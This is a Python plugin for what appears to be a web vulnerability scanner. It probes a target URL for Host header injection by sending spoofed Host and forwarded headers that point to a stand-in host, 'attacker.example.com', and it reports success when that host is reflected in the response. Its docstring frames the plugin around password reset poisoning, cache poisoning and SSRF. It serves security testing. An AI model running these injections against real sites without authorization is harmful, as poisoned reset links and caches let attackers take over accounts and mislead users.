"""
Host Header Injection Exploit Plugin

Provides exploit capabilities for Host Header Injection vulnerabilities:
- Password reset poisoning PoC
- Cache poisoning via Host header
- SSRF via Host header
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_ATTACKER_HOST = 'attacker.example.com'

_INJECTION_HEADERS = [
    {'Host': _ATTACKER_HOST},
    {'X-Forwarded-Host': _ATTACKER_HOST},
    {'X-Host': _ATTACKER_HOST},
    {'X-Forwarded-Server': _ATTACKER_HOST},
    {'X-Original-URL': f'https://{_ATTACKER_HOST}'},
]


class HostHeaderPlugin(ExploitPlugin):
    """Host Header Injection exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'host_header'

    @property
    def name(self) -> str:
        return 'Host Header Injection Exploit'

    @property
    def description(self) -> str:
        return 'Host Header Injection exploit: password reset poisoning, cache poisoning, SSRF.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return injected host header values."""
        return [_ATTACKER_HOST, f'{_ATTACKER_HOST}:80', f'{_ATTACKER_HOST}:443']

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Send requests with injected Host/forwarded headers and check for reflection."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'host_header',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        attacker_host = config.get('attacker_host', _ATTACKER_HOST)

        for header_set in _INJECTION_HEADERS:
            # Replace placeholder with configured attacker host
            headers = {k: v.replace(_ATTACKER_HOST, attacker_host) for k, v in header_set.items()}
            try:
                resp = requests.get(target_url, headers=headers, timeout=timeout,
                                    verify=verify_ssl, allow_redirects=False)
                body = resp.text
                location = resp.headers.get('Location', '')

                if attacker_host in body or attacker_host in location:
                    return {
                        'success': True,
                        'vulnerability_type': 'host_header',
                        'injected_headers': headers,
                        'evidence': (
                            f'Attacker host "{attacker_host}" reflected in response '
                            f'(body={attacker_host in body}, location={attacker_host in location})'
                        ),
                        'message': 'Host header injection confirmed â€” attacker host reflected',
                    }
            except Exception as e:
                logger.debug(f"Host header test error (headers={headers}): {e}")

        return {
            'success': False,
            'error': 'No host header injection confirmed',
            'vulnerability_type': 'host_header',
        }
